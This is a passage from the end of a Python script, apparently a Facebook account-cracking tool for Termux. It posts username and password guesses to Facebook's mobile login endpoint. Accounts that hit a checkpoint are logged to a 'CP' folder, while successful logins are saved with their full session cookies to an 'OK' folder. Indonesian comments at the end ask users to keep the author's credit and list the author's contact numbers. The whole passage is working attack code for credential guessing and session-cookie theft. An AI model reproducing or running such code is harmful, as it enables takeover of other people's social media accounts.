                except:actions = 'login/device-based/regular/login/?next=https%3A%2F%2Fm.facebook.com%2Flogin%2Fsave-device%2F&refsrc=deprecated&lwv=100&refid=9'
                request = session.post(f'https://{uhost}'+ actions, data=data, headers=headers)
                if ('checkpoint') in session.cookies.get_dict():
                    CP.append(uname)
                    print('\r %s* + --> %s|%s'%(K,uname,pasw))
                    wkwk = '%s|%s\n'%(uname,pasw)
                    self.save('CP', wkwk)
                    break

                elif ('c_user') in session.cookies.get_dict():
                    OK.append(uname)
                    coki = (";").join([wwh+'='+iih for wwh,iih in session.cookies.get_dict().items()])
                    print('\r %s* + --> %s|%s|%s'%(H,uname,pasw,coki))
                    wkwk = '%s|%s|%s\n'%(uname,pasw,coki)
                    self.save('OK',wkwk)
                    break
            except requests.exceptions.ConnectionError:time.sleep(30)
        tambah +=1


if __name__ == '__main__':
   try:os.mkdir('OK')
   except:pass
   try:os.mkdir('CP')
   except:pass
   try:os.mkdir('data')
   except:pass
   MainTermux()

# Makasih Buat Kamu Yang Gak Ganti/Hapus Bot Aku ♥
# Di Pelajari Bukan Di Ganti Banner Dan Di Tambahin Warna :v

# WhatsApp : 085729416714
# Facebook : 100090703092541
# Maap Kalo Ndak Ada Hasil ':)
# Jangan Lupa Follow,Kasih Bintang ';)
